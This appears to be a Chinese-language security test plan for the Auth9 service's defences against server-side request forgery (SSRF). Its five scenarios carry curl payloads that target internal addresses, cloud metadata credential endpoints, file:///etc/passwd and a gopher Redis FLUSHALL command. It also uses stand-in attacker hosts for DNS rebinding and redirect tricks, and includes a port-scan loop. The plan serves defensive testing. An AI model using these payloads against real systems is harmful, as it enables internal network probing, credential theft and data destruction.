# 输入验证 - 服务器端请求伪造 (SSRF) 测试

**模块**: 输入验证
**测试范围**: SSRF 攻击防护
**场景数**: 5
**风险等级**: 🔴 极高
**OWASP ASVS**: V12.6, V5.2

---

## 背景知识

Auth9 存在多个接受 URL 输入的功能，构成 SSRF 攻击面：
- **Webhook 配置** (`POST /api/v1/webhooks`) - 用户可配置回调 URL
- **Branding Logo URL** (`PUT /api/v1/branding`) - 自定义品牌 Logo 地址
- **Identity Provider 配置** - 社交登录 IdP 端点 URL
- **Keycloak 通信** - 后端主动请求 Keycloak API

SSRF 可导致：内网服务探测、云元数据泄露 (AWS/GCP/Azure)、内部 API 未授权访问。

---

## 场景 1：Webhook URL 内网探测

### 前置条件
- 具有 `create:webhooks` 权限的 Tenant Access Token
- 了解目标内网 IP 段

### 攻击目标
验证 Webhook URL 是否允许指向内网地址，进而探测内网服务

### 攻击步骤
1. 创建 Webhook，URL 指向内网地址
2. 触发 Webhook 事件
3. 观察响应差异（超时/拒绝连接/成功），推断内网拓扑
4. 逐步扫描内网端口

### 预期安全行为
- 拒绝内网 IP 地址 (RFC 1918: 10.x, 172.16-31.x, 192.168.x)
- 拒绝回环地址 (127.0.0.1, ::1, localhost)
- 拒绝链路本地地址 (169.254.x.x)
- 拒绝云元数据地址 (169.254.169.254)
- 返回明确错误：`URL points to a private/internal address`

### 验证方法
```bash
# 回环地址
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/webhooks \
  -d '{"url": "http://127.0.0.1:4000/", "events": ["user.created"]}'
# 预期: 400 Bad Request - URL 指向内网地址

# IPv6 回环
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/webhooks \
  -d '{"url": "http://[::1]:8080/health", "events": ["user.created"]}'
# 预期: 400

# 内网地址
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/webhooks \
  -d '{"url": "http://192.168.1.1:8080/", "events": ["user.created"]}'
# 预期: 400

# 云元数据端点 (AWS)
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/webhooks \
  -d '{"url": "http://169.254.169.254/latest/meta-data/", "events": ["user.created"]}'
# 预期: 400

# 云元数据端点 (GCP)
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/webhooks \
  -d '{"url": "http://metadata.google.internal/computeMetadata/v1/", "events": ["user.created"]}'
# 预期: 400
```

### 修复建议
- 实现 URL 解析后 IP 白名单/黑名单检查
- 使用 allowlist 仅允许公网 IP
- 在 DNS 解析后再次验证 IP（防止 DNS 重绑定）
- 禁止非 HTTP/HTTPS 协议

---

## 场景 2：URL 协议滥用

### 前置条件
- 具有创建 Webhook 或配置 Branding 的权限

### 攻击目标
验证是否可通过非 HTTP 协议读取本地文件或访问其他服务

### 攻击步骤
1. 在 URL 字段中使用非 HTTP 协议
2. 尝试读取服务器本地文件
3. 尝试访问其他协议的服务

### 预期安全行为
- 仅允许 `http://` 和 `https://` 协议
- 拒绝 `file://`, `gopher://`, `dict://`, `ftp://`, `ldap://` 等
- 返回协议不支持的错误

### 验证方法
```bash
# file:// 协议
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/webhooks \
  -d '{"url": "file:///etc/passwd", "events": ["user.created"]}'
# 预期: 400 - 不支持的协议

# gopher 协议 (可用于发送任意 TCP 数据)
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/webhooks \
  -d '{"url": "gopher://127.0.0.1:6379/_FLUSHALL", "events": ["user.created"]}'
# 预期: 400

# dict 协议
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/webhooks \
  -d '{"url": "dict://127.0.0.1:6379/INFO", "events": ["user.created"]}'
# 预期: 400

# data URI
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/webhooks \
  -d '{"url": "data:text/html,<script>alert(1)</script>", "events": ["user.created"]}'
# 预期: 400
```

### 修复建议
- 严格限制协议白名单：仅 `http`, `https`
- URL 解析后验证 scheme
- 不信任用户提供的 URL 进行任何服务端请求

---

## 场景 3：DNS 重绑定攻击

### 前置条件
- 攻击者控制一个域名的 DNS 解析
- 该域名第一次解析为公网 IP，第二次解析为内网 IP

### 攻击目标
验证 SSRF 防护是否能抵抗 DNS 重绑定 (DNS Rebinding) 绕过

### 攻击步骤
1. 配置恶意域名 `evil.attacker.com`：
   - 第一次 DNS 查询返回 `1.2.3.4`（通过 IP 验证）
   - 第二次 DNS 查询返回 `127.0.0.1`（实际请求打到内网）
2. 设置极短的 DNS TTL (如 0 秒)
3. 创建 Webhook URL 为 `http://evil.attacker.com:4000/`
4. 等待 Webhook 触发时的实际 DNS 解析

### 预期安全行为
- 在 DNS 解析后、发起请求前验证 IP
- 或锁定第一次解析的 IP 发起请求
- 拒绝指向内网的 DNS 解析结果

### 验证方法
```bash
# 使用 rebinder 工具模拟 DNS 重绑定
# https://lock.cmpxchg8b.com/rebinder.html
# 设置 A 记录在公网IP和127.0.0.1之间交替

# 创建 Webhook 指向重绑定域名
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/webhooks \
  -d '{"url": "http://rebind.attacker.com:8080/callback", "events": ["user.created"]}'

# 触发事件后检查内网服务日志
# 如果内网服务收到请求，则存在 DNS 重绑定漏洞
```

### 修复建议
- DNS 解析后验证 IP 地址是否为内网
- 使用固定 DNS 解析结果（pin DNS resolution）
- 设置自定义 DNS resolver 忽略过短 TTL
- 考虑使用连接时 IP 验证（socket 级别）

---

## 场景 4：Branding Logo URL SSRF

### 前置条件
- 具有 `update:branding` 权限的 Token
- Branding 功能支持自定义 Logo URL

### 攻击目标
验证品牌 Logo URL 是否可被用于 SSRF 攻击

### 攻击步骤
1. 设置 Logo URL 为内网地址
2. 访问管理界面触发 Logo 加载
3. 如果服务器端获取 Logo 图片，检查是否可探测内网

### 预期安全行为
- Logo URL 仅在客户端（浏览器）加载，不经服务器代理
- 如果服务器端获取：应用与 Webhook 相同的 SSRF 防护
- 验证 URL 指向有效的图片资源

### 验证方法
```bash
# 设置 Logo URL 为内网
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/branding \
  -d '{"logo_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# 预期: 400 或接受但不做服务端请求

# 设置 Logo URL 为探测端口
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/branding \
  -d '{"logo_url": "http://127.0.0.1:6379/"}'
# 预期: 400 或仅客户端渲染

# 验证服务端是否主动请求
# 使用 Burp Collaborator 或 webhook.site 监控
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/branding \
  -d '{"logo_url": "https://YOUR_COLLABORATOR.burpcollaborator.net/logo.png"}'
# 如果 Collaborator 收到请求且 User-Agent 是服务端，则存在 SSRF
```

### 修复建议
- Logo URL 仅在前端浏览器加载，不经服务端代理
- 如需服务端处理，实现完整 SSRF 防护
- 限制 URL 为 HTTPS
- 验证 Content-Type 为图片格式

---

## 场景 5：重定向链 SSRF

### 前置条件
- Webhook 或 URL 请求跟随 HTTP 重定向

### 攻击目标
验证 SSRF 防护是否在 HTTP 重定向链的每一跳都生效

### 攻击步骤
1. 设置公网服务器 `https://attacker.com/redirect`
2. 该服务器返回 `302 Location: http://127.0.0.1:4000/`
3. 创建 Webhook URL 为 `https://attacker.com/redirect`
4. 初始 URL 通过公网 IP 验证
5. 跟随重定向后请求到达内网

### 预期安全行为
- 每次重定向都重新验证目标 IP
- 限制最大重定向次数（如 ≤ 3 次）
- 或完全禁止跟随重定向

### 验证方法
```bash
# 在攻击者服务器设置重定向
# Python 示例:
# from http.server import HTTPServer, BaseHTTPRequestHandler
# class Handler(BaseHTTPRequestHandler):
#     def do_POST(self):
#         self.send_response(302)
#         self.send_header('Location', 'http://127.0.0.1:4000/')
#         self.end_headers()

# 创建指向重定向服务的 Webhook
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/webhooks \
  -d '{"url": "https://attacker.com/redirect-to-internal", "events": ["user.created"]}'

# 触发事件后检查内网服务是否收到请求
# 预期: 重定向到内网地址被阻止
```

### 修复建议
- 重定向链每一跳都验证目标 IP
- 限制最大重定向次数
- 优先禁止 Webhook 跟随重定向
- 记录所有重定向链到日志

---

## 检查清单

| # | 场景 | 状态 | 测试日期 | 测试人员 | 发现问题 |
|---|------|------|----------|----------|----------|
| 1 | Webhook URL 内网探测 | ☐ | | | |
| 2 | URL 协议滥用 | ☐ | | | |
| 3 | DNS 重绑定攻击 | ☐ | | | |
| 4 | Branding Logo URL SSRF | ☐ | | | |
| 5 | 重定向链 SSRF | ☐ | | | |

---

## 自动化测试工具

```bash
# SSRFmap - SSRF 自动化利用
python3 ssrfmap.py -r request.txt -p url -m portscan

# Burp Collaborator - 检测带外 SSRF
# 使用 Collaborator payload 替换 URL

# 自定义 SSRF 扫描
for ip in 127.0.0.1 10.0.0.1 172.16.0.1 192.168.1.1 169.254.169.254; do
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    http://localhost:8080/api/v1/webhooks \
    -d "{\"url\": \"http://$ip/\", \"events\": [\"user.created\"]}"
  echo " - $ip"
done
```

---

## 参考资料

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [DNS Rebinding Attack](https://en.wikipedia.org/wiki/DNS_rebinding)
